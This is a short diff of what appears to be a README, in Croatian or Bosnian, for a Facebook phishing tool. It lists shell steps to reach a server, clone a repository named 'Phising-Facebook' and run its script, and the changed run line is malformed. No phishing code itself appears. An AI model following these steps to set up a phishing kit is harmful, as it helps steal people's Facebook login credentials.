@@ -5,7 +5,7 @@ $ssh hostname@ip-server -p 22
 $git clone https://github.com/Anonimus-Haker-Alon-Kreker-Darker/Phising-Facebook.git
 $cd Phising-Facebook
 $ls
-$bash python3 phising.py
+$bash python python.py
 
 
 Phishing napadi prisutni su od najranijeg doba interneta.
